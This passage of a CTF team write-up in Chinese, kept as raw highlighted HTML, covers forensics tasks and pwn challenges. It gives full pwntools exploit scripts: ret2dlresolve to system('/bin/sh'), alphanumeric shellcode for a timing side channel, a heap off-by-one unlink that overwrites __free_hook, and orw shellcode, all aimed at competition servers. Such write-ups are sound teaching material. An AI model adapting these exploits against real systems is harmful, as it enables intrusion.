builtin">open</span><span class="token punctuation">(</span>base <span class="token operator">+</span> name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>            result <span class="token operator">+=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>可得到以下文本，在里面找到flag</p><p>FLAG{Dir3ct0ry_jYa_n41}</p><h2 id="EzTime-SOLVED-｜-D0gekong"><a href="#EzTime-SOLVED-｜-D0gekong" class="headerlink" title="EzTime | SOLVED ｜ D0gekong"></a>EzTime | SOLVED ｜ D0gekong</h2><p>解压得到文件</p><p>直接用ntfs log tracker工具一把梭</p><p>根据题目提示发现有很多跟flag相似的文本</p><p>一个一个尝试，最后发现flag是{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png</p><h2 id="BlueTeaming-SOLVED｜Hn13"><a href="#BlueTeaming-SOLVED｜Hn13" class="headerlink" title="BlueTeaming | SOLVED｜Hn13"></a>BlueTeaming | SOLVED｜Hn13</h2><p>解压文件可得memory.dmp,通过volatility的dump口令将注册表给提取出来放入windows registry recovery查看注册表</p><p>查阅路径翻到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication里有power shell 脚本 </p><p>到后面才意识到这就是</p><p>flag:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication</p><h2 id="CipherMan-SOLVED-Hn13"><a href="#CipherMan-SOLVED-Hn13" class="headerlink" title="CipherMan | SOLVED |Hn13"></a>CipherMan | SOLVED |Hn13</h2><p>解压文件，打开两个卷发现里面的secret需要先获取密码才能解开分区.</p><p>由给出的内容可知，密码应该放在memory中，结合filescan以及grep发现两个文件</p><p>导出来是这样</p><p>221628-533357-667392-449185-516428-718443-190674-375100为解密密钥</p><p>输入密钥打开后有个readme文件，打开就是flag</p><p>flag：Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lessonlater.</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h1><h2 id="强网先锋-on-output-SOLVED-winter"><a href="#强网先锋-on-output-SOLVED-winter" class="headerlink" title="[强网先锋]on output| SOLVED |winter"></a>[强网先锋]on output| SOLVED |winter</h2><p>触发就能有如下的溢出</p><p>直接触发信号得到溢出进行ret2_dl_runtime_resolve就行了</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token comment">#p = process("./test")</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.138.97'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x30</span>src <span class="token operator">=</span> <span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">0x20</span>s<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>s<span class="token punctuation">(</span>src<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"hello_boy\x00\x00\x00\x00\x00\x00\x00"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-2147483648"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfrop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>context<span class="token punctuation">.</span>binary<span class="token punctuation">)</span>dlresolve <span class="token operator">=</span> Ret2dlresolvePayload<span class="token punctuation">(</span>elf<span class="token punctuation">,</span>symbol<span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>dlresolve<span class="token punctuation">.</span>data_addr<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>ret2dlresolve<span class="token punctuation">(</span>dlresolve<span class="token punctuation">)</span>raw_rop <span class="token operator">=</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0x4c</span><span class="token punctuation">:</span>raw_rop<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">:</span>dlresolve<span class="token punctuation">.</span>payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="Shellcode-SOLVED-H3h3QAQ"><a href="#Shellcode-SOLVED-H3h3QAQ" class="headerlink" title="Shellcode | SOLVED | H3h3QAQ"></a>Shellcode | SOLVED | H3h3QAQ</h2><p>Read和mmap没有被禁。</p><p>先mmap出一片空间，然后切换位数，再次read shellcode，再把flag读入内存，循环用cmp一位一位判断，最后拼接得到flag。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># context(log_level = 'debug')</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">:</span>    append_x86 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push ebx    pop ebx    '''</span>    shellcode_open <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov esp,0x40404140    push 0x67616c66    push esp    pop ebx    xor ecx,ecx    mov eax,5    int 0x80    mov ecx,eax    '''</span>    shellcode_flag <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x33    push 0x40404089    retfq    mov rdi,rcx    mov rsi,rsp    mov rdx,0x70    xor rax,rax    syscall    '''</span>     <span class="token comment"># cmp</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    shellcode_open <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_open<span class="token punctuation">)</span>    shellcode_flag <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_flag<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">''</span>    append <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rdx    pop rdx    '''</span>    shellcode_mmap <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rdi    push 0x7e    pop rsi    push 0x40    pop rax    xor al,0x47    push rax    pop rdx    push 0x40    pop rax    xor al,0x40    push rax    pop r8    push rax    pop r9    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x31],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x32],cl    push 0x22    pop rcx    push 0x40    pop rax    xor al,0x49    '''</span>    shellcode_read <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rsi    push 0x40    pop rax    xor al,0x40    push rax    pop rdi    xor al,0x40    push 0x70    pop rdx    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x57],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x58],cl    push rdx    pop rax    xor al,0x70    '''</span>    shellcode_retfq <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rbx    pop rax    xor al,0x40    push 0x72    pop rcx    xor byte ptr[rax+0x40],cl    push 0x68    pop rcx    xor byte ptr[rax+0x40],cl    push 0x47    pop rcx    sub byte ptr[rax+0x41],cl    push 0x48    pop rcx    sub byte ptr[rax+0x41],cl    push rdi    push rdi    push 0x23    push 0x40404040    pop rax    push rax    '''</span>    shellcode <span class="token operator">+=</span> shellcode_mmap    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_read    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_retfq    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode_open <span class="token operator">+</span> <span class="token number">0x29</span><span class="token operator">*</span><span class="token string">b'\x90'</span> <span class="token operator">+</span> shellcode_flag<span class="token punctuation">)</span>index <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.105.137.118'</span><span class="token punctuation">,</span> <span class="token number">50050</span><span class="token punctuation">)</span>        <span class="token comment">#p=process('./shellcode')</span>        pwn<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">1.5</span><span class="token punctuation">:</span>            flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    index <span class="token operator">=</span> index <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="Baby-diary-SOLVED-NN"><a href="#Baby-diary-SOLVED-NN" class="headerlink" title="Baby_diary| SOLVED | NN"></a>Baby_diary| SOLVED | NN</h2><p>输入函数存在off by one漏洞</p><p>由于要绕过检查，我们利用largebin的残留数据伪造chunk，再通过off by one改inuse位，实现unlink，这里需要改一下fd，由于输入函数会放‘\x00’，这里要爆破一下，后面就是leak和打freehook了。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./baby_diary')</span><span class="token comment">#sh=remote('8.140.114.72', 1399)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./baby_diary'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token comment">#context.log_level="debug"</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x4c60</span><span class="token punctuation">)</span>                      <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>                      add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>                        delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>                     add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x801</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>i<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p8<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token operator">+</span><span class="token number">0x801</span><span class="token operator">-</span><span class="token number">0x251</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x800</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0xfb0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    show<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    leak_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_arena_offset<span class="token operator">=</span><span class="token number">0x1ebb80</span>    libc_base<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    success<span class="token punctuation">(</span><span class="token string">'libc:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x700</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment">#sh=process("./baby_diary")</span>        sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'8.140.114.72'</span><span class="token punctuation">,</span> <span class="token number">1399</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="强网先锋-orw-SOLVED-NN"><a href="#强网先锋-orw-SOLVED-NN" class="headerlink" title="[强网先锋]orw | SOLVED | NN"></a>[强网先锋]orw | SOLVED | NN</h2><p>对elf文件ida打开后分析可知存在下标越界和输入无限制漏洞。</p><p>指针数组的下标v1没有检查</p><p>直接回车，就能无限输入，摆脱大小限制。</p><p>直接利用下标越界，申请一个chunk分配给-25的位置，在输入shellcode实现orw，最后触发。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./orw')</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.131.68'</span><span class="token punctuation">,</span><span class="token number">12354</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./orw'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    shellcode<span class="token operator">=</span><span class="token triple-quoted-string string">'''    xor rax, rax    xor rdi, rdi    xor rsi, rsi    xor rdx, rdx    mov rax, 2    mov rdi, 0x67616c662f2e    push rdi    mov rdi, rsp    syscall    mov rdx, 0x100    mov rsi, rdi    mov rdi, rax    mov rax, 0    syscall    mov rdi, 1    mov rax, 1    syscall'''</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-25'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h1><h2 id="pop-mater-SOLVED-Hn13"><a href="#pop-mater-SOLVED-Hn13" class="headerlink" title="pop_mater | SOLVED | Hn13"></a>pop_mater | SOLVED | Hn13</h2><p>直接写脚本回溯POP链：</p><pre class="language-python" data-language="python"><code class="language-python"><span 